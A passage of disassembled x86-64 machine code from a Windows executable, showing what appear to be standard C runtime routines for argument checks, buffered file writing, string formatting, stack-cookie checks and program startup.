   140002cc5:	48 8b cb             	mov    %rbx,%rcx
   140002cc8:	e8 4b 16 00 00       	call   0x140004318
   140002ccd:	eb d6                	jmp    0x140002ca5
   140002ccf:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140002cd4:	48 83 c4 20          	add    $0x20,%rsp
   140002cd8:	5f                   	pop    %rdi
   140002cd9:	c3                   	ret
   140002cda:	cc                   	int3
   140002cdb:	cc                   	int3
   140002cdc:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002ce1:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002ce6:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002ceb:	41 56                	push   %r14
   140002ced:	48 83 ec 30          	sub    $0x30,%rsp
   140002cf1:	48 89 64 24 20       	mov    %rsp,0x20(%rsp)
   140002cf6:	45 8b f0             	mov    %r8d,%r14d
   140002cf9:	48 8b fa             	mov    %rdx,%rdi
   140002cfc:	48 8b f1             	mov    %rcx,%rsi
   140002cff:	33 c0                	xor    %eax,%eax
   140002d01:	48 85 c9             	test   %rcx,%rcx
   140002d04:	0f 95 c0             	setne  %al
   140002d07:	85 c0                	test   %eax,%eax
   140002d09:	75 14                	jne    0x140002d1f
   140002d0b:	e8 68 18 00 00       	call   0x140004578
   140002d10:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140002d16:	e8 0d 14 00 00       	call   0x140004128
   140002d1b:	33 c0                	xor    %eax,%eax
   140002d1d:	eb 7c                	jmp    0x140002d9b
   140002d1f:	33 c0                	xor    %eax,%eax
   140002d21:	48 85 d2             	test   %rdx,%rdx
   140002d24:	0f 95 c0             	setne  %al
   140002d27:	85 c0                	test   %eax,%eax
   140002d29:	74 e0                	je     0x140002d0b
   140002d2b:	33 c0                	xor    %eax,%eax
   140002d2d:	38 02                	cmp    %al,(%rdx)
   140002d2f:	0f 95 c0             	setne  %al
   140002d32:	85 c0                	test   %eax,%eax
   140002d34:	74 d5                	je     0x140002d0b
   140002d36:	e8 85 1c 00 00       	call   0x1400049c0
   140002d3b:	48 8b d8             	mov    %rax,%rbx
   140002d3e:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002d43:	48 85 c0             	test   %rax,%rax
   140002d46:	75 0d                	jne    0x140002d55
   140002d48:	e8 2b 18 00 00       	call   0x140004578
   140002d4d:	c7 00 18 00 00 00    	movl   $0x18,(%rax)
   140002d53:	eb c6                	jmp    0x140002d1b
   140002d55:	80 3e 00             	cmpb   $0x0,(%rsi)
   140002d58:	75 22                	jne    0x140002d7c
   140002d5a:	e8 19 18 00 00       	call   0x140004578
   140002d5f:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140002d65:	48 8d 15 0c 00 00 00 	lea    0xc(%rip),%rdx        # 0x140002d78
   140002d6c:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140002d71:	e8 5a 20 00 00       	call   0x140004dd0
   140002d76:	90                   	nop
   140002d77:	90                   	nop
   140002d78:	33 c0                	xor    %eax,%eax
   140002d7a:	eb 1f                	jmp    0x140002d9b
   140002d7c:	4c 8b c8             	mov    %rax,%r9
   140002d7f:	45 8b c6             	mov    %r14d,%r8d
   140002d82:	48 8b d7             	mov    %rdi,%rdx
   140002d85:	48 8b ce             	mov    %rsi,%rcx
   140002d88:	e8 6b 1d 00 00       	call   0x140004af8
   140002d8d:	48 8b f8             	mov    %rax,%rdi
   140002d90:	48 8b cb             	mov    %rbx,%rcx
   140002d93:	e8 80 15 00 00       	call   0x140004318
   140002d98:	48 8b c7             	mov    %rdi,%rax
   140002d9b:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140002da0:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140002da5:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140002daa:	48 83 c4 30          	add    $0x30,%rsp
   140002dae:	41 5e                	pop    %r14
   140002db0:	c3                   	ret
   140002db1:	cc                   	int3
   140002db2:	cc                   	int3
   140002db3:	cc                   	int3
   140002db4:	41 b8 40 00 00 00    	mov    $0x40,%r8d
   140002dba:	e9 1d ff ff ff       	jmp    0x140002cdc
   140002dbf:	cc                   	int3
   140002dc0:	48 8b c4             	mov    %rsp,%rax
   140002dc3:	48 89 50 10          	mov    %rdx,0x10(%rax)
   140002dc7:	48 89 48 08          	mov    %rcx,0x8(%rax)
   140002dcb:	4c 89 40 18          	mov    %r8,0x18(%rax)
   140002dcf:	4c 89 48 20          	mov    %r9,0x20(%rax)
   140002dd3:	53                   	push   %rbx
   140002dd4:	56                   	push   %rsi
   140002dd5:	57                   	push   %rdi
   140002dd6:	41 56                	push   %r14
   140002dd8:	48 83 ec 28          	sub    $0x28,%rsp
   140002ddc:	48 8b f1             	mov    %rcx,%rsi
   140002ddf:	33 ff                	xor    %edi,%edi
   140002de1:	33 c0                	xor    %eax,%eax
   140002de3:	48 85 c9             	test   %rcx,%rcx
   140002de6:	0f 95 c0             	setne  %al
   140002de9:	85 c0                	test   %eax,%eax
   140002deb:	75 18                	jne    0x140002e05
   140002ded:	e8 86 17 00 00       	call   0x140004578
   140002df2:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140002df8:	e8 2b 13 00 00       	call   0x140004128
   140002dfd:	83 c8 ff             	or     $0xffffffff,%eax
   140002e00:	e9 d9 00 00 00       	jmp    0x140002ede
   140002e05:	33 c0                	xor    %eax,%eax
   140002e07:	48 85 d2             	test   %rdx,%rdx
   140002e0a:	0f 95 c0             	setne  %al
   140002e0d:	85 c0                	test   %eax,%eax
   140002e0f:	74 dc                	je     0x140002ded
   140002e11:	4c 8d 74 24 60       	lea    0x60(%rsp),%r14
   140002e16:	e8 61 14 00 00       	call   0x14000427c
   140002e1b:	90                   	nop
   140002e1c:	f6 46 18 40          	testb  $0x40,0x18(%rsi)
   140002e20:	0f 85 80 00 00 00    	jne    0x140002ea6
   140002e26:	48 8b ce             	mov    %rsi,%rcx
   140002e29:	e8 56 13 00 00       	call   0x140004184
   140002e2e:	4c 63 c0             	movslq %eax,%r8
   140002e31:	41 8d 48 02          	lea    0x2(%r8),%ecx
   140002e35:	4c 8d 0d d4 80 01 00 	lea    0x180d4(%rip),%r9        # 0x14001af10
   140002e3c:	83 f9 01             	cmp    $0x1,%ecx
   140002e3f:	76 1e                	jbe    0x140002e5f
   140002e41:	49 8b d0             	mov    %r8,%rdx
   140002e44:	49 8b c8             	mov    %r8,%rcx
   140002e47:	48 c1 f9 05          	sar    $0x5,%rcx
   140002e4b:	83 e2 1f             	and    $0x1f,%edx
   140002e4e:	48 6b c2 58          	imul   $0x58,%rdx,%rax
   140002e52:	49 03 04 c9          	add    (%r9,%rcx,8),%rax
   140002e56:	48 8d 0d 03 67 01 00 	lea    0x16703(%rip),%rcx        # 0x140019560
   140002e5d:	eb 0a                	jmp    0x140002e69
   140002e5f:	48 8d 0d fa 66 01 00 	lea    0x166fa(%rip),%rcx        # 0x140019560
   140002e66:	48 8b c1             	mov    %rcx,%rax
   140002e69:	f6 40 38 7f          	testb  $0x7f,0x38(%rax)
   140002e6d:	75 24                	jne    0x140002e93
   140002e6f:	41 8d 40 02          	lea    0x2(%r8),%eax
   140002e73:	83 f8 01             	cmp    $0x1,%eax
   140002e76:	76 15                	jbe    0x140002e8d
   140002e78:	49 8b c8             	mov    %r8,%rcx
   140002e7b:	49 8b c0             	mov    %r8,%rax
   140002e7e:	48 c1 f8 05          	sar    $0x5,%rax
   140002e82:	83 e1 1f             	and    $0x1f,%ecx
   140002e85:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   140002e89:	49 03 0c c1          	add    (%r9,%rax,8),%rcx
   140002e8d:	f6 41 38 80          	testb  $0x80,0x38(%rcx)
   140002e91:	74 13                	je     0x140002ea6
   140002e93:	e8 e0 16 00 00       	call   0x140004578
   140002e98:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140002e9e:	e8 85 12 00 00       	call   0x140004128
   140002ea3:	83 cf ff             	or     $0xffffffff,%edi
   140002ea6:	85 ff                	test   %edi,%edi
   140002ea8:	75 2a                	jne    0x140002ed4
   140002eaa:	48 8b ce             	mov    %rsi,%rcx
   140002ead:	e8 ba 1f 00 00       	call   0x140004e6c
   140002eb2:	8b d8                	mov    %eax,%ebx
   140002eb4:	4d 8b ce             	mov    %r14,%r9
   140002eb7:	45 33 c0             	xor    %r8d,%r8d
   140002eba:	48 8b 54 24 58       	mov    0x58(%rsp),%rdx
   140002ebf:	48 8b ce             	mov    %rsi,%rcx
   140002ec2:	e8 1d 21 00 00       	call   0x140004fe4
   140002ec7:	8b f8                	mov    %eax,%edi
   140002ec9:	48 8b d6             	mov    %rsi,%rdx
   140002ecc:	8b cb                	mov    %ebx,%ecx
   140002ece:	e8 61 1f 00 00       	call   0x140004e34
   140002ed3:	90                   	nop
   140002ed4:	48 8b ce             	mov    %rsi,%rcx
   140002ed7:	e8 3c 14 00 00       	call   0x140004318
   140002edc:	8b c7                	mov    %edi,%eax
   140002ede:	48 83 c4 28          	add    $0x28,%rsp
   140002ee2:	41 5e                	pop    %r14
   140002ee4:	5f                   	pop    %rdi
   140002ee5:	5e                   	pop    %rsi
   140002ee6:	5b                   	pop    %rbx
   140002ee7:	c3                   	ret
   140002ee8:	48 8b c4             	mov    %rsp,%rax
   140002eeb:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140002eef:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140002ef3:	48 89 70 20          	mov    %rsi,0x20(%rax)
   140002ef7:	4c 89 40 18          	mov    %r8,0x18(%rax)
   140002efb:	57                   	push   %rdi
   140002efc:	41 54                	push   %r12
   140002efe:	41 55                	push   %r13
   140002f00:	41 56                	push   %r14
   140002f02:	41 57                	push   %r15
   140002f04:	48 83 ec 20          	sub    $0x20,%rsp
   140002f08:	49 8b f1             	mov    %r9,%rsi
   140002f0b:	4c 8b f2             	mov    %rdx,%r14
   140002f0e:	4c 8b f9             	mov    %rcx,%r15
   140002f11:	48 85 d2             	test   %rdx,%rdx
   140002f14:	74 1a                	je     0x140002f30
   140002f16:	4d 85 c0             	test   %r8,%r8
   140002f19:	74 15                	je     0x140002f30
   140002f1b:	4d 85 c9             	test   %r9,%r9
   140002f1e:	75 2f                	jne    0x140002f4f
   140002f20:	e8 53 16 00 00       	call   0x140004578
   140002f25:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140002f2b:	e8 f8 11 00 00       	call   0x140004128
   140002f30:	33 c0                	xor    %eax,%eax
   140002f32:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140002f37:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   140002f3c:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140002f41:	48 83 c4 20          	add    $0x20,%rsp
   140002f45:	41 5f                	pop    %r15
   140002f47:	41 5e                	pop    %r14
   140002f49:	41 5d                	pop    %r13
   140002f4b:	41 5c                	pop    %r12
   140002f4d:	5f                   	pop    %rdi
   140002f4e:	c3                   	ret
   140002f4f:	48 85 c9             	test   %rcx,%rcx
   140002f52:	74 cc                	je     0x140002f20
   140002f54:	33 d2                	xor    %edx,%edx
   140002f56:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140002f5a:	49 f7 f6             	div    %r14
   140002f5d:	4c 3b c0             	cmp    %rax,%r8
   140002f60:	77 be                	ja     0x140002f20
   140002f62:	49 8b fe             	mov    %r14,%rdi
   140002f65:	49 0f af f8          	imul   %r8,%rdi
   140002f69:	41 f7 41 18 0c 01 00 	testl  $0x10c,0x18(%r9)
   140002f70:	00 
   140002f71:	48 8b ef             	mov    %rdi,%rbp
   140002f74:	74 06                	je     0x140002f7c
   140002f76:	45 8b 61 24          	mov    0x24(%r9),%r12d
   140002f7a:	eb 06                	jmp    0x140002f82
   140002f7c:	41 bc 00 10 00 00    	mov    $0x1000,%r12d
   140002f82:	48 85 ff             	test   %rdi,%rdi
   140002f85:	0f 84 e3 00 00 00    	je     0x14000306e
   140002f8b:	8b 46 18             	mov    0x18(%rsi),%eax
   140002f8e:	25 08 01 00 00       	and    $0x108,%eax
   140002f93:	74 39                	je     0x140002fce
   140002f95:	44 8b 6e 08          	mov    0x8(%rsi),%r13d
   140002f99:	45 85 ed             	test   %r13d,%r13d
   140002f9c:	74 30                	je     0x140002fce
   140002f9e:	0f 88 82 00 00 00    	js     0x140003026
   140002fa4:	48 8b 0e             	mov    (%rsi),%rcx
   140002fa7:	49 3b ed             	cmp    %r13,%rbp
   140002faa:	49 8b d7             	mov    %r15,%rdx
   140002fad:	44 0f 42 ed          	cmovb  %ebp,%r13d
   140002fb1:	45 8b c5             	mov    %r13d,%r8d
   140002fb4:	41 8b dd             	mov    %r13d,%ebx
   140002fb7:	e8 64 f2 ff ff       	call   0x140002220
   140002fbc:	44 29 6e 08          	sub    %r13d,0x8(%rsi)
   140002fc0:	48 01 1e             	add    %rbx,(%rsi)
   140002fc3:	48 2b eb             	sub    %rbx,%rbp
   140002fc6:	4c 03 fb             	add    %rbx,%r15
   140002fc9:	e9 92 00 00 00       	jmp    0x140003060
   140002fce:	41 8b dc             	mov    %r12d,%ebx
   140002fd1:	48 3b eb             	cmp    %rbx,%rbp
   140002fd4:	72 64                	jb     0x14000303a
   140002fd6:	85 c0                	test   %eax,%eax
   140002fd8:	74 0c                	je     0x140002fe6
   140002fda:	48 8b ce             	mov    %rsi,%rcx
   140002fdd:	e8 8a 16 00 00       	call   0x14000466c
   140002fe2:	85 c0                	test   %eax,%eax
   140002fe4:	75 44                	jne    0x14000302a
   140002fe6:	45 85 e4             	test   %r12d,%r12d
   140002fe9:	74 0e                	je     0x140002ff9
   140002feb:	33 d2                	xor    %edx,%edx
   140002fed:	48 8b c5             	mov    %rbp,%rax
   140002ff0:	48 f7 f3             	div    %rbx
   140002ff3:	8b dd                	mov    %ebp,%ebx
   140002ff5:	2b da                	sub    %edx,%ebx
   140002ff7:	eb 02                	jmp    0x140002ffb
   140002ff9:	8b dd                	mov    %ebp,%ebx
   140002ffb:	48 8b ce             	mov    %rsi,%rcx
   140002ffe:	e8 81 11 00 00       	call   0x140004184
   140003003:	44 8b c3             	mov    %ebx,%r8d
   140003006:	49 8b d7             	mov    %r15,%rdx
   140003009:	8b c8                	mov    %eax,%ecx
   14000300b:	e8 d0 2f 00 00       	call   0x140005fe0
   140003010:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003013:	74 11                	je     0x140003026
   140003015:	8b c8                	mov    %eax,%ecx
   140003017:	3b c3                	cmp    %ebx,%eax
   140003019:	0f 47 cb             	cmova  %ebx,%ecx
   14000301c:	48 2b e9             	sub    %rcx,%rbp
   14000301f:	4c 03 f9             	add    %rcx,%r15
   140003022:	3b c3                	cmp    %ebx,%eax
   140003024:	73 3a                	jae    0x140003060
   140003026:	83 4e 18 20          	orl    $0x20,0x18(%rsi)
   14000302a:	48 2b fd             	sub    %rbp,%rdi
   14000302d:	33 d2                	xor    %edx,%edx
   14000302f:	48 8b c7             	mov    %rdi,%rax
   140003032:	49 f7 f6             	div    %r14
   140003035:	e9 f8 fe ff ff       	jmp    0x140002f32
   14000303a:	41 0f be 0f          	movsbl (%r15),%ecx
   14000303e:	48 8b d6             	mov    %rsi,%rdx
   140003041:	e8 0e 2e 00 00       	call   0x140005e54
   140003046:	83 f8 ff             	cmp    $0xffffffff,%eax
   140003049:	74 df                	je     0x14000302a
   14000304b:	49 ff c7             	inc    %r15
   14000304e:	48 ff cd             	dec    %rbp
   140003051:	83 7e 24 00          	cmpl   $0x0,0x24(%rsi)
   140003055:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   14000305b:	44 0f 4f 66 24       	cmovg  0x24(%rsi),%r12d
   140003060:	48 85 ed             	test   %rbp,%rbp
   140003063:	0f 85 22 ff ff ff    	jne    0x140002f8b
   140003069:	4c 8b 44 24 60       	mov    0x60(%rsp),%r8
   14000306e:	49 8b c0             	mov    %r8,%rax
   140003071:	e9 bc fe ff ff       	jmp    0x140002f32
   140003076:	cc                   	int3
   140003077:	cc                   	int3
   140003078:	48 8b c4             	mov    %rsp,%rax
   14000307b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000307f:	48 89 70 10          	mov    %rsi,0x10(%rax)
   140003083:	48 89 78 18          	mov    %rdi,0x18(%rax)
   140003087:	4c 89 48 20          	mov    %r9,0x20(%rax)
   14000308b:	41 56                	push   %r14
   14000308d:	48 83 ec 20          	sub    $0x20,%rsp
   140003091:	49 8b d9             	mov    %r9,%rbx
   140003094:	49 8b f8             	mov    %r8,%rdi
   140003097:	48 8b f2             	mov    %rdx,%rsi
   14000309a:	4c 8b f1             	mov    %rcx,%r14
   14000309d:	48 85 d2             	test   %rdx,%rdx
   1400030a0:	74 4d                	je     0x1400030ef
   1400030a2:	4d 85 c0             	test   %r8,%r8
   1400030a5:	74 48                	je     0x1400030ef
   1400030a7:	33 c0                	xor    %eax,%eax
   1400030a9:	48 85 db             	test   %rbx,%rbx
   1400030ac:	0f 95 c0             	setne  %al
   1400030af:	85 c0                	test   %eax,%eax
   1400030b1:	75 12                	jne    0x1400030c5
   1400030b3:	e8 c0 14 00 00       	call   0x140004578
   1400030b8:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400030be:	e8 65 10 00 00       	call   0x140004128
   1400030c3:	eb 2a                	jmp    0x1400030ef
   1400030c5:	48 8b cb             	mov    %rbx,%rcx
   1400030c8:	e8 af 11 00 00       	call   0x14000427c
   1400030cd:	90                   	nop
   1400030ce:	4c 8b cb             	mov    %rbx,%r9
   1400030d1:	4c 8b c7             	mov    %rdi,%r8
   1400030d4:	48 8b d6             	mov    %rsi,%rdx
   1400030d7:	49 8b ce             	mov    %r14,%rcx
   1400030da:	e8 09 fe ff ff       	call   0x140002ee8
   1400030df:	48 8b f8             	mov    %rax,%rdi
   1400030e2:	48 8b cb             	mov    %rbx,%rcx
   1400030e5:	e8 2e 12 00 00       	call   0x140004318
   1400030ea:	48 8b c7             	mov    %rdi,%rax
   1400030ed:	eb 02                	jmp    0x1400030f1
   1400030ef:	33 c0                	xor    %eax,%eax
   1400030f1:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400030f6:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   1400030fb:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140003100:	48 83 c4 20          	add    $0x20,%rsp
   140003104:	41 5e                	pop    %r14
   140003106:	c3                   	ret
   140003107:	cc                   	int3
   140003108:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   14000310d:	4c 89 44 24 18       	mov    %r8,0x18(%rsp)
   140003112:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   140003117:	55                   	push   %rbp
   140003118:	53                   	push   %rbx
   140003119:	57                   	push   %rdi
   14000311a:	48 8b ec             	mov    %rsp,%rbp
   14000311d:	48 83 ec 50          	sub    $0x50,%rsp
   140003121:	48 83 65 d0 00       	andq   $0x0,-0x30(%rbp)
   140003126:	48 8b fa             	mov    %rdx,%rdi
   140003129:	33 d2                	xor    %edx,%edx
   14000312b:	48 8b d9             	mov    %rcx,%rbx
   14000312e:	48 8d 4d d8          	lea    -0x28(%rbp),%rcx
   140003132:	44 8d 42 28          	lea    0x28(%rdx),%r8d
   140003136:	e8 65 f6 ff ff       	call   0x1400027a0
   14000313b:	48 85 ff             	test   %rdi,%rdi
   14000313e:	75 15                	jne    0x140003155
   140003140:	e8 33 14 00 00       	call   0x140004578
   140003145:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000314b:	e8 d8 0f 00 00       	call   0x140004128
   140003150:	83 c8 ff             	or     $0xffffffff,%eax
   140003153:	eb 4b                	jmp    0x1400031a0
   140003155:	48 85 db             	test   %rbx,%rbx
   140003158:	74 e6                	je     0x140003140
   14000315a:	4c 8d 4d 30          	lea    0x30(%rbp),%r9
   14000315e:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140003162:	45 33 c0             	xor    %r8d,%r8d
   140003165:	48 8b d7             	mov    %rdi,%rdx
   140003168:	c7 45 d8 ff ff ff 7f 	movl   $0x7fffffff,-0x28(%rbp)
   14000316f:	c7 45 e8 42 00 00 00 	movl   $0x42,-0x18(%rbp)
   140003176:	48 89 5d e0          	mov    %rbx,-0x20(%rbp)
   14000317a:	48 89 5d d0          	mov    %rbx,-0x30(%rbp)
   14000317e:	e8 61 1e 00 00       	call   0x140004fe4
   140003183:	ff 4d d8             	decl   -0x28(%rbp)
   140003186:	8b d8                	mov    %eax,%ebx
   140003188:	78 09                	js     0x140003193
   14000318a:	48 8b 4d d0          	mov    -0x30(%rbp),%rcx
   14000318e:	c6 01 00             	movb   $0x0,(%rcx)
   140003191:	eb 0b                	jmp    0x14000319e
   140003193:	48 8d 55 d0          	lea    -0x30(%rbp),%rdx
   140003197:	33 c9                	xor    %ecx,%ecx
   140003199:	e8 b6 2c 00 00       	call   0x140005e54
   14000319e:	8b c3                	mov    %ebx,%eax
   1400031a0:	48 83 c4 50          	add    $0x50,%rsp
   1400031a4:	5f                   	pop    %rdi
   1400031a5:	5b                   	pop    %rbx
   1400031a6:	5d                   	pop    %rbp
   1400031a7:	c3                   	ret
   1400031a8:	48 83 ec 28          	sub    $0x28,%rsp
   1400031ac:	4d 8b 41 38          	mov    0x38(%r9),%r8
   1400031b0:	48 8b ca             	mov    %rdx,%rcx
   1400031b3:	49 8b d1             	mov    %r9,%rdx
   1400031b6:	e8 0d 00 00 00       	call   0x1400031c8
   1400031bb:	b8 01 00 00 00       	mov    $0x1,%eax
   1400031c0:	48 83 c4 28          	add    $0x28,%rsp
   1400031c4:	c3                   	ret
   1400031c5:	cc                   	int3
   1400031c6:	cc                   	int3
   1400031c7:	cc                   	int3
   1400031c8:	40 53                	rex push %rbx
   1400031ca:	48 83 ec 20          	sub    $0x20,%rsp
   1400031ce:	45 8b 18             	mov    (%r8),%r11d
   1400031d1:	48 8b da             	mov    %rdx,%rbx
   1400031d4:	4c 8b c9             	mov    %rcx,%r9
   1400031d7:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   1400031db:	41 f6 00 04          	testb  $0x4,(%r8)
   1400031df:	4c 8b d1             	mov    %rcx,%r10
   1400031e2:	74 13                	je     0x1400031f7
   1400031e4:	41 8b 40 08          	mov    0x8(%r8),%eax
   1400031e8:	4d 63 50 04          	movslq 0x4(%r8),%r10
   1400031ec:	f7 d8                	neg    %eax
   1400031ee:	4c 03 d1             	add    %rcx,%r10
   1400031f1:	48 63 c8             	movslq %eax,%rcx
   1400031f4:	4c 23 d1             	and    %rcx,%r10
   1400031f7:	49 63 c3             	movslq %r11d,%rax
   1400031fa:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   1400031fe:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140003202:	8b 48 08             	mov    0x8(%rax),%ecx
   140003205:	48 03 4b 08          	add    0x8(%rbx),%rcx
   140003209:	f6 41 03 0f          	testb  $0xf,0x3(%rcx)
   14000320d:	74 0c                	je     0x14000321b
   14000320f:	0f b6 41 03          	movzbl 0x3(%rcx),%eax
   140003213:	83 e0 f0             	and    $0xfffffff0,%eax
   140003216:	48 98                	cltq
   140003218:	4c 03 c8             	add    %rax,%r9
   14000321b:	4c 33 ca             	xor    %rdx,%r9
   14000321e:	49 8b c9             	mov    %r9,%rcx
   140003221:	48 83 c4 20          	add    $0x20,%rsp
   140003225:	5b                   	pop    %rbx
   140003226:	e9 15 00 00 00       	jmp    0x140003240
   14000322b:	cc                   	int3
   14000322c:	cc                   	int3
   14000322d:	cc                   	int3
   14000322e:	cc                   	int3
   14000322f:	cc                   	int3
   140003230:	cc                   	int3
   140003231:	cc                   	int3
   140003232:	cc                   	int3
   140003233:	cc                   	int3
   140003234:	cc                   	int3
   140003235:	cc                   	int3
   140003236:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000323d:	00 00 00 
   140003240:	48 3b 0d b9 5d 01 00 	cmp    0x15db9(%rip),%rcx        # 0x140019000
   140003247:	75 11                	jne    0x14000325a
   140003249:	48 c1 c1 10          	rol    $0x10,%rcx
   14000324d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140003252:	75 02                	jne    0x140003256
   140003254:	f3 c3                	repz ret
   140003256:	48 c1 c9 10          	ror    $0x10,%rcx
   14000325a:	e9 2d ee ff ff       	jmp    0x14000208c
   14000325f:	cc                   	int3
   140003260:	48 83 ec 28          	sub    $0x28,%rsp
   140003264:	e8 57 49 00 00       	call   0x140007bc0
   140003269:	48 83 c4 28          	add    $0x28,%rsp
   14000326d:	e9 02 00 00 00       	jmp    0x140003274
   140003272:	cc                   	int3
   140003273:	cc                   	int3
   140003274:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140003279:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000327e:	57                   	push   %rdi
   14000327f:	48 83 ec 30          	sub    $0x30,%rsp
   140003283:	e8 a8 06 00 00       	call   0x140003930
   140003288:	0f b7 f0             	movzwl %ax,%esi
   14000328b:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003290:	e8 e3 48 00 00       	call   0x140007b78
   140003295:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   14000329a:	48 8d 3d 5f cd ff ff 	lea    -0x32a1(%rip),%rdi        # 0x140000000
   1400032a1:	66 39 05 58 cd ff ff 	cmp    %ax,-0x32a8(%rip)        # 0x140000000
   1400032a8:	74 04                	je     0x1400032ae
   1400032aa:	33 db                	xor    %ebx,%ebx
   1400032ac:	eb 31                	jmp    0x1400032df
   1400032ae:	48 63 05 87 cd ff ff 	movslq -0x3279(%rip),%rax        # 0x14000003c
   1400032b5:	48 03 c7             	add    %rdi,%rax
   1400032b8:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   1400032be:	75 ea                	jne    0x1400032aa
   1400032c0:	b9 0b 02 00 00       	mov    $0x20b,%ecx
   1400032c5:	66 39 48 18          	cmp    %cx,0x18(%rax)
   1400032c9:	75 df                	jne    0x1400032aa
   1400032cb:	33 db                	xor    %ebx,%ebx
   1400032cd:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
   1400032d4:	76 09                	jbe    0x1400032df
   1400032d6:	39 98 f8 00 00 00    	cmp    %ebx,0xf8(%rax)
   1400032dc:	0f 95 c3             	setne  %bl
   1400032df:	89 5c 24 40          	mov    %ebx,0x40(%rsp)
   1400032e3:	e8 9c 41 00 00       	call   0x140007484
   1400032e8:	85 c0                	test   %eax,%eax
   1400032ea:	75 22                	jne    0x14000330e
   1400032ec:	83 3d d5 85 01 00 01 	cmpl   $0x1,0x185d5(%rip)        # 0x14001b8c8
   1400032f3:	75 05                	jne    0x1400032fa
   1400032f5:	e8 9a 45 00 00       	call   0x140007894
   1400032fa:	b9 1c 00 00 00       	mov    $0x1c,%ecx
   1400032ff:	e8 04 46 00 00       	call   0x140007908
   140003304:	b9 ff 00 00 00       	mov    $0xff,%ecx
   140003309:	e8 fe 3b 00 00       	call   0x140006f0c
   14000330e:	e8 11 3a 00 00       	call   0x140006d24
   140003313:	85 c0                	test   %eax,%eax
   140003315:	75 22                	jne    0x140003339
   140003317:	83 3d aa 85 01 00 01 	cmpl   $0x1,0x185aa(%rip)        # 0x14001b8c8
   14000331e:	75 05                	jne    0x140003325
   140003320:	e8 6f 45 00 00       	call   0x140007894
   140003325:	b9 10 00 00 00       	mov    $0x10,%ecx
   14000332a:	e8 d9 45 00 00       	call   0x140007908
   14000332f:	b9 ff 00 00 00       	mov    $0xff,%ecx
   140003334:	e8 d3 3b 00 00       	call   0x140006f0c
   140003339:	e8 2e 49 00 00       	call   0x140007c6c
   14000333e:	90                   	nop
   14000333f:	e8 e0 27 00 00       	call   0x140005b24
   140003344:	85 c0                	test   %eax,%eax
   140003346:	79 0a                	jns    0x140003352
   140003348:	b9 1b 00 00 00       	mov    $0x1b,%ecx
   14000334d:	e8 ae 00 00 00       	call   0x140003400
   140003352:	ff 15 50 dd 00 00    	call   *0xdd50(%rip)        # 0x1400110a8
   140003358:	48 89 05 31 9a 01 00 	mov    %rax,0x19a31(%rip)        # 0x14001cd90
   14000335f:	e8 78 49 00 00       	call   0x140007cdc
   140003364:	48 89 05 65 7b 01 00 	mov    %rax,0x17b65(%rip)        # 0x14001aed0
   14000336b:	e8 34 41 00 00       	call   0x1400074a4
   140003370:	85 c0                	test   %eax,%eax
   140003372:	79 0a                	jns    0x14000337e
   140003374:	b9 08 00 00 00       	mov    $0x8,%ecx
   140003379:	e8 a6 3b 00 00       	call   0x140006f24
   14000337e:	e8 dd 43 00 00       	call   0x140007760
   140003383:	85 c0                	test   %eax,%eax
   140003385:	79 0a                	jns    0x140003391
   140003387:	b9 09 00 00 00       	mov    $0x9,%ecx
   14000338c:	e8 93 3b 00 00       	call   0x140006f24
   140003391:	b9 01 00 00 00       	mov    $0x1,%ecx
   140003396:	e8 d1 3b 00 00       	call   0x140006f6c
   14000339b:	85 c0                	test   %eax,%eax
   14000339d:	74 07                	je     0x1400033a6
   14000339f:	8b c8                	mov    %eax,%ecx
   1400033a1:	e8 7e 3b 00 00       	call   0x140006f24
   1400033a6:	e8 25 4a 00 00       	call   0x140007dd0
   1400033ab:	44 0f b7 ce          	movzwl %si,%r9d
   1400033af:	4c 8b c0             	mov    %rax,%r8
   1400033b2:	33 d2                	xor    %edx,%edx
   1400033b4:	48 8b cf             	mov    %rdi,%rcx
   1400033b7:	e8 88 eb ff ff       	call   0x140001f44
   1400033bc:	8b f8                	mov    %eax,%edi
   1400033be:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400033c2:	85 db                	test   %ebx,%ebx
   1400033c4:	75 07                	jne    0x1400033cd
